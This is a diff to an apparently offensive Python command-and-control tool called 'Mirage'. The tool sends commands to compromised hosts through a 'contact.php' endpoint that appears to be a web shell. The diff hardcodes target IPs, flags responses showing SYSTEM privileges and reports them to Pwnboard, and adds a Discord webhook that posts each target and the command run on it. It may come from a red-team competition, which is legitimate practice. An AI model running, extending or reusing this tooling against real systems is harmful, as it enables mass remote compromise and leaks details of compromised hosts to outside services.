@@ -6,6 +6,8 @@ import threading
 import socket
 import re
 import urllib3
+from datetime import datetime
+from pytz import timezone
 from pyfiglet import Figlet
 from rich.console import Console
 from rich.text import Text
@@ -22,6 +24,9 @@ from InquirerPy.utils import get_style
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 ALL_HOSTS = [
+    "192.168.1.3",
+    "192.168.1.4",
+    "192.168.1.6",
     # All Hosts
 ]
 
@@ -51,6 +56,7 @@ CONCURRENCY = 8
 THROTTLE_MS = 50
 PWNBOARD_URL = "https://www.pwnboard.win/pwn"
 AUTH_TOKEN = "Bearer YOUR_PWNBOARD_AUTH_TOKEN_HERE"  # Replace with your actual token
+WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE"  # Replace with your actual webhook URL
 
 # Callback Global Variables
 unprivileged_results = []
@@ -59,6 +65,13 @@ failed_results = []
 error_results = []
 
 console = Console() # For ASCII Art
+
+# Compiled Regex Patterns
+COMMAND_RE = re.compile(r'Command:\s*(.+)')
+SYSTEM_RE = re.compile(r"nt authority\\system", re.IGNORECASE)
+
+# Set Time Zone
+tz = timezone('EST')
 
 matrix_style = get_style({
     "questionmark": "fg:#00FF00 bold",        # bright neon green
@@ -201,9 +214,6 @@ def select_local_ip():
     return selected_ip
 
 def fwd_pwnboard(target, result):
-    #print("\nForwarding valid callback to Pwnboard...") testing
-    #print(target)
-
     # Set up JSON Request
     data = {}
     data["ip"] = target
@@ -238,6 +248,37 @@ def fwd_pwnboard(target, result):
             "status": "PRIVILEGED - Pwnboard Error", 
             "pwnboard_status": f"Error: {nourl}"
         })
+
+def fwd_discord(target, response):
+    # Extract the command from the response
+    command = COMMAND_RE.search(response).group(1)
+    # print(f"Sending : {formatted_msg}")
+
+    # Setup Post Request
+    data = {
+        "username": "Mirage",
+        "embeds": [
+            {
+                "title": "✅ Command Executed Successfully",
+                "color": 0x00FF00,  # green
+                "fields": [
+                    {"name": "Target", "value": f"`{target}`", "inline": False},
+                    {"name": "Command", "value": f"```bash\n{command}\n```", "inline": False}
+                ],
+                "footer": {"text": "Mirage"},
+                "timestamp": str(datetime.now(tz))
+            }
+        ]
+    }
+
+    # Send and check result
+    try:
+        result = requests.post(WEBHOOK_URL, json = data, timeout = 5)
+        result.raise_for_status()
+    except requests.exceptions.HTTPError as err:
+        print(err)
+    except requests.exceptions.MissingSchema as nourl:
+        print("No Discord URL provided : Skipping Webhook")
 
 def send_command(client, port, command, callback=False):
     contact_url = f"http://{client}:{port}/contact.php"
@@ -451,8 +492,7 @@ def run_threads(clients, port, command, action_type="command", attacker_ip=None,
         successful_results = [r for r in results if r["color"] == "#00ff00"]
         for result in successful_results:
             response_text = str(result["response"])
-            match = re.search(r"nt authority\\system", response_text, re.IGNORECASE)
-            if match:
+            if SYSTEM_RE.search(response_text):
                 fwd_pwnboard(result["target"], result)
             else:
                 unprivileged_results.append(result)
@@ -866,10 +906,22 @@ def display_results(results, action_type):
             console.print("[bold #00ff00]📊 FINAL SUMMARY[/bold #00ff00]")
             console.print(f"{double_line}")
             console.print(f"[#00ff00]✅ Successful: {success_count} targets[/#00ff00]")
-            console.print(f"[#ffff00]⚠️ Warnings:  {warning_count} targets[/#ffff00]")
-            console.print(f"[#ff0000]❌ Failed:    {error_count} targets[/#ff0000]")
-            console.print(f"[bold white]📋 Total:     {len(sorted_results)} targets processed[/bold white]")
+            console.print(f"[#ffff00]⚠️ Warnings:   {warning_count} targets[/#ffff00]")
+            console.print(f"[#ff0000]❌ Failed:     {error_count} targets[/#ff0000]")
+            console.print(f"[bold white]📋 Total:      {len(sorted_results)} targets[/bold white]")
             console.print(f"{double_line}")
+
+    print()
+    log_successful_results = inquirer.confirm(
+        message="Log all successful results to Discord?",
+        default=True,
+        style=text_style
+    ).execute()
+    
+    if log_successful_results:
+        for result in sorted_results:
+            if result["color"] == "#00ff00":
+                fwd_discord(result["target"], result["response"])
 
 def singular_execution():
     while True:
@@ -951,8 +1003,8 @@ def singular_execution():
     
     # Target header
     console.print(Panel(
-        f"[bold #00ff00]🎯 TARGET: {target}[/bold #00ff00]",
-        border_style="#00ff00",
+        f"[bold {status_color}]🎯 TARGET: {target}[/bold {status_color}]",
+        border_style=status_color,
         width=line_length,
         padding=(0, 1)
     ))
@@ -973,6 +1025,16 @@ def singular_execution():
     # Final separator
     console.print(f"\n{double_line}")
     console.print(f"{double_line}")
+
+    if status_color == "#00ff00":
+        print()
+        log_successful_results = inquirer.confirm(
+            message="Log successful result to Discord?",
+            default=True,
+            style=text_style
+        ).execute()
+        if log_successful_results:
+            fwd_discord(target, response)
 
 def mass_execution(command=None, callback=False):
     targets = choose_targets()
@@ -1134,7 +1196,7 @@ def main():
         else:
             print("Unknown action, returning to menu.")
         
-        print()  # Empty line for readability
+        print()
 
 if __name__ == "__main__":
     main()
